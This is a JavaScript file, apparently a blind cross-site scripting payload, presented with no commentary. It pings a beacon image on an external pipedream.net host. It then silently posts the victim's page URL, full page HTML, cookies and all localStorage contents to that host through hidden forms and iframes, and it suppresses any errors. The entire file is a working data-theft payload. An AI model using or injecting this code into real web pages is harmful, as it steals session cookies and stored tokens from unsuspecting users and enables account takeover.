try {
  var elem = document.createElement('img');
elem.src = 'https://en90slubioxb.x.pipedream.net/BXSSV1';
document.body.appendChild(elem);
  
  //https://stackoverflow.com/a/6169703
  function Exfil(f, n) {
  // Add the iframe with a unique name
  var iframe = document.createElement("iframe");
  var uniqueString = n;
  document.body.appendChild(iframe);
  iframe.style.display = "none";
  iframe.contentWindow.name = uniqueString;

  // construct a form with hidden inputs, targeting the iframe
  var form = document.createElement("form");
  form.target = uniqueString;
  form.action = "https://en90slubioxb.x.pipedream.net/exfil";
  form.method = "POST";

  f(form);
  document.body.appendChild(form);
  form.submit();
  }
  
  Exfil(function(form){
   var input = document.createElement("input");
  input.type = "hidden";
  input.name = "location";
  input.value = document.location.href;
  form.appendChild(input);
  }, "xfil1");
  
  Exfil(function(form){
   var input = document.createElement("input");
  input.type = "hidden";
  input.name = "html_code";
  input.value = document.body.innerHTML;
  form.appendChild(input);
  }, "xfil2");
  
    Exfil(function(form){
   var input = document.createElement("input");
  input.type = "hidden";
  input.name = "cookies";
  input.value = document.cookie;
  form.appendChild(input);
  }, "xfil3");
  
     Exfil(function(form){
   var input = document.createElement("input");
  input.type = "hidden";
  input.name = "localStorage";
         str = "";
	     try {
for(var i=0, len=localStorage.length; i<len; i++) {
	if (str.length)
		str += "&";
    var key = localStorage.key(i);
    var value = localStorage[key];
    str += encodeURIComponent(key) + "=" + encodeURIComponent(value);
  }
		     }catch(error) {  
			     str = "<unknown>";
		     }
  input.value = str;
  form.appendChild(input);
  }, "xfil4");
  
  
}catch(error) {  
}
